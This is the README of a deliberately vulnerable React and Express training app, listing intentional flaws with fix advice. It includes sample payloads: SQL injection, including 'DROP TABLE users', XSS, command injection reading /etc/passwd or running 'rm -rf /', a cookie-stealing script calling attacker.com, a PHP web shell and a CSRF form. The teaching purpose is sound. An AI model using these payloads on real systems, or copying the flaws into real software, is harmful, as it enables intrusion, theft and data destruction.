# Vulnerable React Application

⚠️ **WARNING: This application contains intentional security vulnerabilities for educational purposes only. DO NOT deploy to production environments!** ⚠️

## Overview

This is a deliberately vulnerable React application with a Node.js/Express backend designed to help developers learn about common web application security vulnerabilities and how to identify and fix them.

## Setup Instructions

1. **Install dependencies:**
   ```bash
   npm install
   ```

2. **Start the backend server:**
   ```bash
   npm run server
   ```

3. **In a new terminal, start the React development server:**
   ```bash
   npm start
   ```

4. **Access the application:**
   - Frontend: http://localhost:3000
   - Backend API: http://localhost:3001

## Test Credentials

- **Admin User:** `admin` / `admin123`
- **Regular User:** `user` / `password`
- **Test User:** `test` / `123456`

## Intentional Security Vulnerabilities

### 🔴 Critical Vulnerabilities

#### 1. SQL Injection (CWE-89)
**Location:** `server/app.js` - Multiple endpoints
**Description:** Direct string concatenation in SQL queries allows attackers to execute arbitrary SQL commands.

**Examples:**
- Login endpoint: `SELECT * FROM users WHERE username = '${username}'`
- Comments: `INSERT INTO comments... VALUES ('${content}')`
- Admin SQL console: Direct query execution

**Exploitation:**
```sql
-- In login username field:
admin' OR '1'='1' --

-- In comments:
'; DROP TABLE users; --
```

#### 2. Cross-Site Scripting (XSS) - Stored & Reflected
**Location:** Multiple React components
**Description:** User input is rendered without sanitization using `dangerouslySetInnerHTML`.

**Affected Components:**
- `Comments.js` - Comment content
- `UserProfile.js` - Profile information
- `Login.js` - Error messages
- `Dashboard.js` - User welcome message

**Exploitation:**
```html
<script>alert('XSS')</script>
<img src="x" onerror="alert('XSS')">
<svg onload="alert('XSS')">
```

#### 3. Authentication & Session Management Issues
**Location:** `server/app.js`, Frontend components
**Description:** Multiple authentication vulnerabilities.

**Issues:**
- JWT secret hardcoded: `super-secret-key-123`
- JWT tokens stored in localStorage (vulnerable to XSS)
- Passwords included in JWT payload
- Weak password hashing (1 salt round)
- No session invalidation
- Tokens sent in URL parameters

#### 4. Broken Access Control
**Location:** Multiple components and API endpoints
**Description:** Insufficient authorization checks.

**Issues:**
- Client-side role checking only (`user.role === 'admin'`)
- No server-side authorization validation
- Direct object references without permission checks
- Admin functions accessible with manipulated user object

#### 5. Command Injection
**Location:** `server/app.js` - `/api/action` and `/api/execute` endpoints
**Description:** User input executed directly in shell commands.

**Exploitation:**
```bash
# In action field:
test; cat /etc/passwd

# File execution:
filename.js; rm -rf /
```

### 🟠 High Vulnerabilities

#### 6. Insecure File Upload
**Location:** `FileUpload.js`, `server/app.js`
**Description:** No file type, size, or content validation.

**Issues:**
- Accepts any file type (`accept="*/*"`)
- User-controllable upload path
- No filename sanitization
- Arbitrary file execution endpoint
- Files served without authentication

#### 7. Sensitive Data Exposure
**Location:** Multiple files
**Description:** Sensitive information exposed in various ways.

**Examples:**
- Database credentials in `.env` file
- API keys in environment variables
- JWT secrets exposed in API responses
- Full error stack traces
- System information in debug endpoints

#### 8. Security Misconfiguration
**Location:** Configuration files, `server/app.js`
**Description:** Insecure default configurations.

**Issues:**
- CORS allows all origins (`origin: '*'`)
- Debug mode enabled in production
- No request rate limiting
- Insecure session configuration
- ESLint security rules disabled

#### 9. Insufficient Logging & Monitoring
**Location:** Throughout application
**Description:** Poor security event logging.

**Issues:**
- Sensitive data logged to console
- No failed login attempt tracking
- No suspicious activity alerts
- Detailed error messages expose system info

### 🟡 Medium Vulnerabilities

#### 10. Cross-Site Request Forgery (CSRF)
**Location:** All forms and API endpoints
**Description:** No CSRF protection mechanisms.

**Affected:**
- Login forms
- Comment submission
- Profile updates
- Admin actions

#### 11. Insecure Cryptographic Storage
**Location:** `server/app.js`, Frontend storage
**Description:** Weak encryption and storage practices.

**Issues:**
- Weak bcrypt salt rounds (1)
- Sensitive data in localStorage
- Weak random number generation for session IDs
- No encryption for sensitive database fields

#### 12. Using Components with Known Vulnerabilities
**Location:** `package.json`
**Description:** Outdated dependencies with known security issues.

**Examples:**
- React 17.0.2 (older version)
- Various npm packages with potential vulnerabilities

#### 13. Insufficient Input Validation
**Location:** All user input fields
**Description:** Lack of proper input validation and sanitization.

**Issues:**
- No email validation
- No URL validation
- No file content validation
- No input length limits

#### 14. Information Disclosure
**Location:** Multiple endpoints and components
**Description:** Unnecessary information exposure.

**Examples:**
- User IDs exposed in frontend
- Database structure revealed in errors
- Server technology stack exposed
- Internal API endpoints listed

### 🔵 Low/Informational Vulnerabilities

#### 15. Missing Security Headers
**Location:** `server/app.js`
**Description:** No security headers implemented.

**Missing Headers:**
- Content-Security-Policy
- X-Frame-Options
- X-Content-Type-Options
- Strict-Transport-Security

#### 16. Weak Password Policy
**Location:** No password requirements
**Description:** No enforcement of strong passwords.

#### 17. No Account Lockout
**Location:** Login endpoint
**Description:** No protection against brute force attacks.

## Security Testing Examples

### SQL Injection Testing
```bash
# Test login SQL injection
curl -X POST http://localhost:3001/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\'' OR '\''1'\''='\''1'\'' --", "password": "anything"}'
```

### XSS Testing
```html
<!-- Test in comment field -->
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
```

### File Upload Testing
```bash
# Upload a malicious file
echo '<?php system($_GET["cmd"]); ?>' > malicious.php
# Upload via the file upload interface
```

### CSRF Testing
```html
<!-- Create a malicious page with auto-submitting form -->
<form action="http://localhost:3001/api/comments" method="POST" id="csrf">
  <input name="content" value="<script>alert('CSRF Attack!')</script>">
  <input name="userId" value="1">
</form>
<script>document.getElementById('csrf').submit();</script>
```

## Fix Recommendations

### Immediate Actions (Critical)
1. **Fix SQL Injection:** Use parameterized queries
2. **Sanitize XSS:** Use proper encoding/escaping
3. **Secure Authentication:** Strong JWT secrets, secure storage
4. **Implement Access Control:** Server-side authorization
5. **Validate File Uploads:** Type, size, content validation

### Security Improvements (High Priority)
1. **Add CSRF Protection:** CSRF tokens
2. **Implement Security Headers:** CSP, HSTS, etc.
3. **Input Validation:** Comprehensive validation
4. **Error Handling:** Generic error messages
5. **Rate Limiting:** Prevent abuse

### Best Practices (Medium Priority)
1. **Security Logging:** Proper audit trails
2. **Password Policy:** Strong password requirements
3. **Account Lockout:** Brute force protection
4. **Regular Updates:** Keep dependencies current
5. **Security Testing:** Automated security scans

## Learning Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [React Security Best Practices](https://snyk.io/blog/10-react-security-best-practices/)
- [Node.js Security Checklist](https://blog.risingstack.com/node-js-security-checklist/)

## Disclaimer

This application is created solely for educational purposes to demonstrate common web application vulnerabilities. The vulnerabilities are intentional and should never be implemented in production applications. The authors are not responsible for any misuse of this code.

## Contributing

If you find additional vulnerabilities or have suggestions for improvements, please open an issue or submit a pull request.

## License

This project is licensed under the MIT License - see the LICENSE file for details.
## 🔒 Security Status

Last security scan: Wed Oct 15 18:13:30 UTC 2025
Vulnerabilities detected: 4

This project uses automated security scanning to detect and address vulnerabilities.
Security fixes are managed through AI-assisted analysis and pull requests.

> **Note**: This section was added by automated security workflow for testing PR logic.
